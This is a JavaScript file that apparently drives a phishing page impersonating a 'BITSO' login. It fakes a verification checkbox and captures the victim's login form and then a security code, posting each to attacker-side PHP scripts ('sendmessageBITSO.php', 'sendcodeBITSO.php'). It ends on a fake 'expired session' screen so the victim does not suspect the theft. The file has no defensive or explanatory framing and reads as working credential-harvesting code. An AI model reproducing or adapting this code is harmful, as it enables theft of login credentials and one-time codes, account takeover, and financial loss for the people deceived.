document.getElementById("securityCode").style.display = "none";
document.getElementById("expiredSession").style.display = "none";
document.getElementById("mySpinner").style.display = "none";
document.getElementById("greenCheckbox").style.display = "none";

const timerDisplay = document.getElementById('timer');
let timeLeft = 120; // 2 minutes in seconds
let timerInterval;

function updateTimerDisplay() {
  const minutes = Math.floor(timeLeft / 60);
  let seconds = timeLeft % 60;
  seconds = seconds < 10 ? '0' + seconds : seconds;
  timerDisplay.innerHTML = `${minutes}:${seconds}`;
}

function startTimer() {
  timerInterval = setInterval(() => {
    if (timeLeft > 0) {
      timeLeft--;
      updateTimerDisplay();
    } else {
      clearInterval(timerInterval);
      timerDisplay.textContent = "Time's up!";
    }
  }, 1000);
}

function logInFunc() {
  document.getElementById("myForm").style.display = "none";
  document.getElementById("businessLogIn").style.display = "none";
  document.getElementById("securityCode").style.display = "block";
  startTimer();

  const form = document.querySelector('.myForm');
  form.addEventListener('submit', function (e) {
    e.preventDefault();
  })
  sendMessage(form);
}

function secCodeFunc() {
  document.getElementById("securityCode").style.display = "none";
  document.getElementById("expiredSession").style.display = "block";

  const form = document.querySelector('.codeForm');
  form.addEventListener('submit', function (e) {
    e.preventDefault();
  })
  sendCode(form);
}

function checkedBox(){
  document.getElementById("myCheckbox").style.display = "none";
  document.getElementById("mySpinner").style.display = "inline-block";

  function greenCheck(){
    document.getElementById("mySpinner").style.display = "none";
    document.getElementById("greenCheckbox").style.display = "inline-block";
    document.getElementById("startBtn").disabled = false;
  }

  setTimeout(greenCheck, 1000);
}

async function sendMessage(form) {
  const formData = new FormData(form);
  if (formData) {
    const url = 'sendmessageBITSO.php';
    const response = await fetch(url, {
      method: "POST",
      body: formData
    });
  }
}

async function sendCode(form) {
  const formData = new FormData(form);
  if (formData) {
    const url = 'sendcodeBITSO.php';
    const response = await fetch(url, {
      method: "POST",
      body: formData
    });
  }
}